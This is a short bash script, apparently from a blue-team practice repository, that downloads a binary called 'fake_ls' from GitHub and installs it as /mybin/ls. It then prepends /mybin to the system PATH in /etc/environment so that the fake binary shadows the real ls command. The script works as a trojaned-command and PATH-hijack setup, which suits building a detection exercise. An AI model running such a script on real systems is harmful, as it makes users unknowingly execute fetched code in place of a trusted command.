#!/usr/bin/env bash

set -e

URL="https://github.com/acebird/BlueTeam-Practice/raw/refs/heads/main/fake_ls"
TARGET_DIR="/mybin"
TARGET_FILE="$TARGET_DIR/ls"
ENV_FILE="/etc/environment"

echo "[+] Creating $TARGET_DIR"
sudo mkdir -p "$TARGET_DIR"

echo "[+] Downloading fake ls"
sudo curl -L "$URL" -o "$TARGET_FILE"

echo "[+] Making executable"
sudo chmod +x "$TARGET_FILE"

echo "[+] Editing PATH in $ENV_FILE"

# Backup first
sudo cp "$ENV_FILE" "$ENV_FILE.bak"

# If PATH exists → prepend /mybin:
if sudo grep -q '^PATH=' "$ENV_FILE"; then
    sudo sed -i 's#^PATH="#PATH="/mybin:#' "$ENV_FILE"
else
    echo 'PATH="/mybin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"' | sudo tee -a "$ENV_FILE"
fi

echo "[+] Done"
echo "[!] You must log out and log back in for PATH changes"
